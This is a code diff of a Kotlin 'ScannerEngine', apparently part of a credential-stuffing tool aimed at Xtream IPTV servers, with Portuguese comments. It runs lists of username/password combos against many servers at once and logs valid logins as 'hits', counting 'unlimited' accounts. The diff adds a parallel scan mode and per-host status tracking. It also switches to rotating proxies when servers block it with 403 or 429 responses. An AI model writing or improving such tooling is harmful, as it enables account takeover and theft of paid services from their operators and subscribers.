@@ -14,10 +14,6 @@ import java.util.concurrent.Executors
 import java.util.concurrent.atomic.AtomicBoolean
 import java.util.concurrent.atomic.AtomicInteger
 
-/**
- * Scan SEQUENCIAL: termina o servidor 1 inteiro, depois 2, depois 3...
- * Foco + velocidade no host atual; avanca automatico.
- */
 class ScannerEngine {
 
     private var job: kotlinx.coroutines.Job? = null
@@ -39,7 +35,8 @@ class ScannerEngine {
         comboName: String,
         threads: Int,
         mode: AtkMode,
-        proxies: List<String> = emptyList()
+        proxies: List<String> = emptyList(),
+        order: ScanOrder = ScanOrder.SEQUENCIAL
     ) {
         stop()
         stopped.set(false)
@@ -56,19 +53,35 @@ class ScannerEngine {
         val proxyIdx = AtomicInteger(0)
         val serverHits = ConcurrentHashMap<String, AtomicInteger>()
         val serverState = ConcurrentHashMap<String, String>()
+        val serverDetail = ConcurrentHashMap<String, String>()
         val useProxyFor = ConcurrentHashMap<String, Boolean>()
+        val consecutiveTo = ConcurrentHashMap<String, AtomicInteger>()
+        val alive200 = ConcurrentHashMap<String, Boolean>()
         val stateMutex = Mutex()
 
         val hosts = servers.map { XtreamApi.normServer(it) }.distinct()
         hosts.forEach {
             serverHits[it] = AtomicInteger(0)
-            serverState[it] = "WAIT" // aguardando vez
+            serverState[it] = if (order == ScanOrder.PARALELO) "SCAN" else "WAIT"
+            serverDetail[it] = ""
             useProxyFor[it] = false
+            consecutiveTo[it] = AtomicInteger(0)
+            alive200[it] = false
         }
 
-        onLog?.invoke("Start ${hosts.size} srv (sequencial) | ${combo.size} combo | thr $threads | ${mode.label} | px ${proxies.size}")
+        onLog?.invoke(
+            "Start ${hosts.size} srv (${order.label}) | ${combo.size} combo | thr $threads | ${mode.label} r${mode.retries} | px ${proxies.size}"
+        )
 
-        val pool = Executors.newFixedThreadPool(threads.coerceIn(1, 64))
+        val thr = threads.coerceIn(1, 64)
+        val thrPerHost = if (order == ScanOrder.PARALELO) {
+            (thr / hosts.size.coerceAtLeast(1)).coerceIn(2, 32)
+        } else thr
+
+        val poolSize = if (order == ScanOrder.PARALELO) {
+            (thrPerHost * hosts.size).coerceIn(2, 64)
+        } else thr
+        val pool = Executors.newFixedThreadPool(poolSize)
         val dispatcher = pool.asCoroutineDispatcher()
         val scope = CoroutineScope(SupervisorJob() + dispatcher)
 
@@ -96,146 +109,206 @@ class ScannerEngine {
                         hc > 0 -> "ON"
                         else -> serverState[h] ?: "..."
                     }
-                    ServerStatus(host = h, state = st, hits = hc)
-                }.sortedWith(compareByDescending<ServerStatus> { it.hits }.thenBy { hosts.indexOf(it.host) })
+                    ServerStatus(host = h, state = st, hits = hc, detail = serverDetail[h] ?: "")
+                }.sortedWith(
+                    compareByDescending<ServerStatus> { it.hits }
+                        .thenBy { hosts.indexOf(it.host) }
+                )
                 onServerStatus?.invoke(ranking)
             } catch (_: Exception) {
             }
         }
 
-        job = scope.launch {
-            for ((idx, server) in hosts.withIndex()) {
-                if (stopped.get()) break
+        suspend fun scanOneHost(server: String, idx: Int) {
+            if (stopped.get()) return
+            stateMutex.withLock {
+                serverState[server] = "SCAN"
+            }
+            onLog?.invoke("→ Servidor ${idx + 1}/${hosts.size}: $server")
+            pushStats()
 
-                // marca atual como SCAN e os futuros WAIT
-                stateMutex.withLock {
-                    serverState[server] = "SCAN"
-                    hosts.drop(idx + 1).forEach { if (serverState[it] == "WAIT" || serverState[it] == "...") serverState[it] = "WAIT" }
+            val channel = Channel<Credential>(capacity = Channel.UNLIMITED)
+            val producer = scope.launch {
+                for (cred in combo) {
+                    if (stopped.get()) break
+                    channel.send(cred)
                 }
-                onLog?.invoke("→ Servidor ${idx + 1}/${hosts.size}: $server")
-                pushStats()
+                channel.close()
+            }
 
-                val channel = Channel<Credential>(capacity = Channel.UNLIMITED)
-                val producer = launch {
-                    for (cred in combo) {
+            val workers = List(thrPerHost) {
+                scope.launch {
+                    for (cred in channel) {
                         if (stopped.get()) break
-                        channel.send(cred)
-                    }
-                    channel.close()
-                }
+                        while (paused.get() && !stopped.get()) delay(200)
+                        if (stopped.get()) break
+                        if (mode.delayMs > 0) delay(mode.delayMs)
 
-                val workers = List(threads.coerceIn(1, 64)) {
-                    launch {
-                        for (cred in channel) {
-                            if (stopped.get()) break
-                            while (paused.get() && !stopped.get()) delay(200)
-                            if (stopped.get()) break
-                            if (mode.delayMs > 0) delay(mode.delayMs)
+                        val needPx = proxies.isNotEmpty() && (useProxyFor[server] == true)
+                        val proxy = if (needPx) {
+                            proxies[proxyIdx.getAndIncrement() % proxies.size]
+                        } else null
 
-                            val needPx = proxies.isNotEmpty() && (useProxyFor[server] == true)
-                            val proxy = if (needPx) {
-                                proxies[proxyIdx.getAndIncrement() % proxies.size]
-                            } else null
+                        var result = XtreamApi.check(
+                            server, cred.user, cred.pass,
+                            timeoutSec = if (proxy != null) mode.timeoutSec.coerceAtMost(5) else mode.timeoutSec,
+                            proxyUrl = proxy,
+                            retries = mode.retries
+                        )
 
-                            var result = XtreamApi.check(
+                        if (proxy == null && proxies.isNotEmpty() && (
+                                result.code == 403 || result.code == 429 ||
+                                    result.err.contains("403") || result.err.contains("429")
+                                )
+                        ) {
+                            useProxyFor[server] = true
+                            stateMutex.withLock {
+                                if ((serverHits[server]?.get() ?: 0) == 0) {
+                                    serverState[server] = "PROT"
+                                    serverDetail[server] = "bloqueio"
+                                }
+                            }
+                            val px = proxies[proxyIdx.getAndIncrement() % proxies.size]
+                            result = XtreamApi.check(
                                 server, cred.user, cred.pass,
-                                timeoutSec = if (proxy != null) mode.timeoutSec.coerceAtMost(5) else mode.timeoutSec,
-                                proxyUrl = proxy
+                                timeoutSec = mode.timeoutSec.coerceAtMost(5),
+                                proxyUrl = px,
+                                retries = mode.retries
                             )
+                        }
 
-                            if (proxy == null && proxies.isNotEmpty() && (
-                                    result.code == 403 || result.code == 429 ||
-                                        result.err.contains("403") || result.err.contains("429")
-                                    )
-                            ) {
-                                useProxyFor[server] = true
+                        if (proxy != null && !result.hit && (
+                                result.err.contains("Timeout", true) || result.code == 0
+                                )
+                        ) {
+                            val direct = XtreamApi.check(
+                                server, cred.user, cred.pass,
+                                timeoutSec = mode.timeoutSec,
+                                proxyUrl = null,
+                                retries = 1
+                            )
+                            if (direct.hit || direct.code in listOf(200, 403, 429)) {
+                                result = direct
+                            }
+                        }
+
+                        val n = checks.incrementAndGet()
+                        when {
+                            result.hit -> {
+                                consecutiveTo[server]?.set(0)
+                                alive200[server] = true
+                                val hit = XtreamApi.buildHit(
+                                    server, cred.user, cred.pass, result.data, comboName
+                                )
+                                hits.incrementAndGet()
+                                if (hit.unlimited) unlimited.incrementAndGet()
+                                serverHits[server]?.incrementAndGet()
                                 stateMutex.withLock {
-                                    if ((serverHits[server]?.get() ?: 0) == 0) serverState[server] = "PROT"
+                                    serverState[server] = "ON"
+                                    serverDetail[server] = "hit"
                                 }
-                                val px = proxies[proxyIdx.getAndIncrement() % proxies.size]
-                                result = XtreamApi.check(
-                                    server, cred.user, cred.pass,
-                                    timeoutSec = mode.timeoutSec.coerceAtMost(5),
-                                    proxyUrl = px
-                                )
+                                try { onHit?.invoke(hit) } catch (_: Exception) {}
                             }
-
-                            if (proxy != null && !result.hit && (
-                                    result.err.contains("Timeout", true) || result.code == 0
-                                    )
-                            ) {
-                                val direct = XtreamApi.check(
-                                    server, cred.user, cred.pass,
-                                    timeoutSec = mode.timeoutSec,
-                                    proxyUrl = null
-                                )
-                                if (direct.hit || direct.code in listOf(200, 403, 429)) {
-                                    result = direct
+                            result.code == 403 || result.err.contains("403") -> {
+                                consecutiveTo[server]?.set(0)
+                                e403.incrementAndGet()
+                                if (proxies.isNotEmpty()) useProxyFor[server] = true
+                                stateMutex.withLock {
+                                    if ((serverHits[server]?.get() ?: 0) == 0) {
+                                        serverState[server] = "PROT"
+                                        serverDetail[server] = "403"
+                                    }
                                 }
                             }
-
-                            val n = checks.incrementAndGet()
-                            when {
-                                result.hit -> {
-                                    val hit = XtreamApi.buildHit(
-                                        server, cred.user, cred.pass, result.data, comboName
-                                    )
-                                    hits.incrementAndGet()
-                                    if (hit.unlimited) unlimited.incrementAndGet()
-                                    serverHits[server]?.incrementAndGet()
-                                    stateMutex.withLock { serverState[server] = "ON" }
-                                    try {
-                                        onHit?.invoke(hit)
-                                    } catch (_: Exception) {
+                            result.code == 429 || result.err.contains("429") -> {
+                                consecutiveTo[server]?.set(0)
+                                e429.incrementAndGet()
+                                if (proxies.isNotEmpty()) useProxyFor[server] = true
+                                stateMutex.withLock {
+                                    if ((serverHits[server]?.get() ?: 0) == 0) {
+                                        serverState[server] = "PROT"
+                                        serverDetail[server] = "429"
                                     }
                                 }
-                                result.code == 403 || result.err.contains("403") -> {
-                                    e403.incrementAndGet()
-                                    if (proxies.isNotEmpty()) useProxyFor[server] = true
+                            }
+                            result.err.contains("Timeout", true) || result.code == 0 -> {
+                                timeouts.incrementAndGet()
+                                val cto = consecutiveTo[server]?.incrementAndGet() ?: 1
+                                if (cto >= 12 && alive200[server] != true &&
+                                    (serverHits[server]?.get() ?: 0) == 0
+                                ) {
                                     stateMutex.withLock {
-                                        if ((serverHits[server]?.get() ?: 0) == 0) serverState[server] = "PROT"
-                                    }
-                                }
-                                result.code == 429 || result.err.contains("429") -> {
-                                    e429.incrementAndGet()
-                                    if (proxies.isNotEmpty()) useProxyFor[server] = true
-                                    stateMutex.withLock {
-                                        if ((serverHits[server]?.get() ?: 0) == 0) serverState[server] = "PROT"
-                                    }
-                                }
-                                result.err.contains("Timeout", true) || result.code == 0 -> {
-                                    timeouts.incrementAndGet()
-                                }
-                                result.code == 200 -> {
-                                    stateMutex.withLock {
-                                        if ((serverHits[server]?.get() ?: 0) == 0 && serverState[server] != "PROT") {
-                                            serverState[server] = "ON"
+                                        if (serverState[server] !in listOf("ON", "PROT")) {
+                                            serverState[server] = "OFF"
+                                            serverDetail[server] = "timeouts"
                                         }
                                     }
                                 }
                             }
+                            result.code == 200 -> {
+                                consecutiveTo[server]?.set(0)
+                                alive200[server] = true
+                                stateMutex.withLock {
+                                    if ((serverHits[server]?.get() ?: 0) == 0 &&
+                                        serverState[server] != "PROT"
+                                    ) {
+                                        serverState[server] = "ON"
+                                        serverDetail[server] = "vivo"
+                                    }
+                                }
+                            }
+                        }
 
-                            if (n % 8 == 0 || result.hit) pushStats()
+                        if (n % 8 == 0 || result.hit) pushStats()
+                    }
+                }
+            }
+
+            producer.join()
+            workers.forEach { it.join() }
+            if (stopped.get()) return
+
+            val hc = serverHits[server]?.get() ?: 0
+            stateMutex.withLock {
+                when {
+                    hc > 0 -> {
+                        serverState[server] = "ON"
+                        serverDetail[server] = "hits"
+                    }
+                    serverState[server] == "PROT" -> {}
+                    serverState[server] == "OFF" -> {}
+                    alive200[server] == true -> {
+                        serverState[server] = "DONE"
+                        serverDetail[server] = "sem hit no combo"
+                    }
+                    else -> {
+                        if ((consecutiveTo[server]?.get() ?: 0) >= 8) {
+                            serverState[server] = "OFF"
+                            serverDetail[server] = "sem resposta"
+                        } else {
+                            serverState[server] = "DONE"
+                            serverDetail[server] = "fim"
                         }
                     }
                 }
+            }
+            onLog?.invoke("✓ Fim $server | ${serverState[server]} | hits $hc")
+            pushStats()
+        }
 
-                producer.join()
-                workers.forEach { it.join() }
-
-                if (stopped.get()) break
-
-                // fim deste servidor
-                val hc = serverHits[server]?.get() ?: 0
-                stateMutex.withLock {
-                    if (hc > 0) serverState[server] = "ON"
-                    else if (serverState[server] == "SCAN") serverState[server] = "DONE"
+        job = scope.launch {
+            if (order == ScanOrder.PARALELO) {
+                val jobs = hosts.mapIndexed { idx, server ->
+                    launch { scanOneHost(server, idx) }
                 }
-                onLog?.invoke("✓ Fim $server | hits $hc")
-                pushStats()
-
-                if (idx < hosts.lastIndex && !stopped.get()) {
-                    onLog?.invoke("→ Proximo: ${hosts[idx + 1]}")
+                jobs.forEach { it.join() }
+            } else {
+                for ((idx, server) in hosts.withIndex()) {
+                    if (stopped.get()) break
+                    scanOneHost(server, idx)
+                    if (idx < hosts.lastIndex && !stopped.get()) {
+                        onLog?.invoke("→ Proximo: ${hosts[idx + 1]}")
+                    }
                 }
             }
 
